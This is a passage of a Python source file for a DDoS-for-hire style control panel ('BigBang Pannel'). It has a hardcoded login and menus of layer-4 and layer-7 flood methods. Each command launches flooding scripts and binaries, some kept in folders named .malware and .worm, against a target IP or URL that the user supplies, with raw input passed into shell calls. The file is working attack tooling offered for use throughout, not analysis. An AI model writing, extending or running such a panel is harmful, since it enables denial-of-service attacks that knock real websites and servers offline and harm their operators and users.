  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()





  def login():
      os.system("clear")
      user = "root"
      passwd = "23"
      username = input("""







                             ⚡ \33[0;32mLOGIN TO BIGBANG-PANNEL : """)
      password = getpass.getpass(prompt="""                  
                             ⚡ \33[0;32mPASSWORDS       : """)
      if username != user or password != passwd:
          print("")
          print(f"""        
                                ☠️ \033[1;31;40mBUY YA SAYANG!!!🚫""")
          time.sleep(0.6)
          sys.exit(1)
      elif username == user and password == passwd:
          print("""                                              
                           ⚡ \33[0;32mWELLCOME TO EXECUTOR TEAM DDOS""")
          time.sleep(0.3)
      menu()
      main()


  login()


if pilih == "2":
  # -*- coding: utf-8 -*-
  from operator import index
  import socket
  import random
  import string
  import threading
  import getpass
  import urllib
  import getpass
  from colorama import Fore, Back
  import os,sys,time,re,requests,json
  from requests import post
  from time import sleep
  from datetime import datetime, date
  import codecs

  B = '\033[35m' #MERAH
  P = '\033[1;37m' #PUTIH

  def layer7():
    os.system ("clear")
    print("""
  \033[37m[ LAYER - 7 ]
  \033[35mNOTE USE:
  METHODE [URL] [PORT] [TIME]

  \033[37m – STRIKE   – TLSV3 
   – BOMB2    – JAVA
   – BOMB     – HTTP
   – GOLDEN   – MIX
   – UAM 
   – TLS 
   – TLSV2

  """)

  def layer12():
    os.system ("clear")
    print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 12 ]
  \033[35mUSE FOR BOT COUNT

  \033[37m– BRUTAL [url] [time]
  – BOT [url] [time]
  – BOT2 [url] [time]

  """)

  def VVIP():
    os.system ("clear")
    print("""
  \033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BILL PANEL
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ VVIP ]
  \033[35mNOTE USE:
  METHODE [URL] [PORT] [TIME]

  \033[37m– HTTPS
  – HTTPS2
  – BYPASS
  – BROWSER
  – KILLNET

  """)

  def layer4():
    os.system ("clear")
    print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ LAYER - 4 ]
  \033[35mNOTE USE: 
  mode   [1/2/3]
  method [GET/POST/HEAD]


  \033[37m – STRESS [ip] [port] [mode] [time]
   – TCP [ip] [port] [time] [method]
   – OVH [ip] [port] [time] [method]


  """)    

  def help():
    os.system ("clear")
    print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'

  \033[37m[ MENU BIGBANG-PANNEL ]
  HOW TO USE TYPE L7 OR L4 TO SEE COMMANDS

  [LAYER-7]       [LAYER-4]       [LAYER-12]      [VVIP]
  \033[35m• STRIKE        • STRESS        • BRUTAL        • HTTPS [\033[32mVVIP\033[35m]
  • BOMB2         • TCP           • BOT           • HTTPS2 [\033[32mVVIP\033[35m]
  • BOMB          • OVH           • BOT2 [\033[32mVIP\033[35m]    • BYPASS [\033[32mVVIP\033[35m]
  • GOLDEN                                        • BROWSER [\033[32mVVIP\033[35m]
  • UAM                                           • KILLNET [\033[32mVVIP\033[35m]
  • TLS [\033[32mVIP\033[35m]
  • TLSV2 [\033[32mVIP\033[35m]
  • TLSV3 [\033[32mVIP\033[35m]
  • JAVA
  • HTTP [\033[32mVIP\033[35m]
  • MIX [\033[32mVIP\033[35m]

  """)

  def menu():
      os.system ("clear")
      print("""
  \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
  \033[37m     `''''MMMMM\033[35m88&&&&''''`
  \033[37m           'MMM\033[35m8&&&'


  \x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
  """)



  def main():

    while True:
      sys.stdout.write(f"\x1b]2;[/] BigBang Pannel :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
      sin = input("\033[0;30;45mBigBang@PANNEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
      sinput = sin.split(" ")[0]
      if sinput == "clear":
        os.system ("clear")
        menu()
      if sinput == "cls" or sinput == "CLS":
        os.system ("pkill screen")
        os.system ("clear")
        menu()
      if sinput == "stop" or sinput == "STOP":
        os.system ("pkill screen")
        menu()			
      if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
        layer12()
      if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
        VVIP()
      if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
        layer7()
      if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
        layer4()
      if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
        help()
      if sinput == "plan":
        plant()
      elif sinput == "":
        main()

  #########LAYER-4########
      elif sinput == "stress" or sinput == "STRESS":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          method = sin.split()[3]
          time = sin.split()[4]
          os.system(f'cd .resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mSTRESSER \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tcp" or sinput == "TCP":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          method = sin.split()[4]
          os.system(f'cd .resources && screen -dm ./TCP {method} {ip} {port} {time} 15000')
          os.system(f'cd .TC1 && screen -dm ./TCP {method} {ip} {port} {time} 7000')
          os.system(f'cd .TC2 && screen -dm ./TCP {method} {ip} {port} {time} 10000')
          os.system(f'cd .resources && screen -dm./RAW {method} {ip} {port} {time} 15000')
          os.system(f'cd .TC1 && screen -dm ./RAW {method} {ip} {port} {time} 7000')
          os.system(f'cd .TC2 && screen -dm ./RAW {method} {ip} {port} {time} 10000')
          os.system(f'cd /media && screen -dm ./RAW {method} {ip} {port} {time} 7000')
          os.system(f'cd /media && screen -dm ./TCP {method} {ip} {port} {time} 7000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mTCP \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "ovh" or sinput == "OVH":
        try:
          ip = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          method = sin.split()[4]
          os.system(f'cd .resources && ./RAW {method} {ip} {port} {time} 15000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mOVH \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()

  #########LAYER-7########  
      elif sinput == "strike" or sinput == "STRIKE":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd /media && screen -dm go run strike.go -url {host} GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mSTRIKE \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "java" or sinput == "JAVA":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .randomstring && cd examples && java input2.java {host} 8000')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mJAVA \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tls" or sinput == "TLS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 45 5 500')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[\033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLS \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bot" or sinput == "BOT":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
          os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
          os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "brutal" or sinput == "BRUTAL":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')				
          os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
          os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
          os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tlsv2" or sinput == "TLSV2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
          os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 32 5 500')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 32 1')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "tlsv3" or sinput == "TLSV3":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')  
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "http" or sinput == "HTTP":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
          os.system(f'cd .malware && screen -dm node HTTP-RAND.js {host} {time}')
          os.system(f'cd .malware && screen -dm node HTTP.js {host} 300 8 {time}')
          os.system(f'cd /media && screen -dm node HTTP.js {host} 300 8 {time}')
          os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bomb2" or sinput == "BOMB2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "bomb" or sinput == "BOMB":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run Low.go -site {host} -data GET')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "golden" or sinput == "GOLDEN":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && python3 goldeneye.py {host} -w 10 -s 500 -m random -d True')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET    : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
  \033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER      : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()
      elif sinput == "https" or sinput == "HTTPS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 8 500')		
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 5 128')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 128')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')	
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
